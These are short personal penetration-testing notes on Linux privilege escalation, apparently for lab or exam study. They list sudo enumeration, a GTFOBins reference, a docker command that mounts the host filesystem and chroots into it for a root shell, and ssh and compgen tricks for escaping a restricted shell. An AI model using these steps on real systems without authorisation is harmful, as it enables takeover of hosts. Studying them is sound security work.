#priviledgeEscalation #linux 

### Sudo Abuse

1. Find the Sodo permitted commands from below command line
```bash
sudo -l
```
2. Then look in GTFO bins

https://gtfobins.github.io/

#### GTFO Notes

##### Docker 
```bash
docker ps
```
then use a existing container
```bash
docker run -v /:/mnt --rm -it <existing docker container> chroot /mnt sh
```



### Breaking Out

- Breaking Out of restrictive shell (rbash) can be done using GTFO -shell  bineries
- Use below first
```bash
ssh eleanor@192.168.45.1 -t "bash --noprofile"
```
- Then type if previous didn't work 
```bash
compgen -c
```
- Copy the list under and get a duplicate then try it out
```
https://docs.google.com/spreadsheets/d/1cpZQfa0x-EySl-oMwacb4PpBLd1OfRgEPJ3UVUGFg-M/edit#gid=0
```

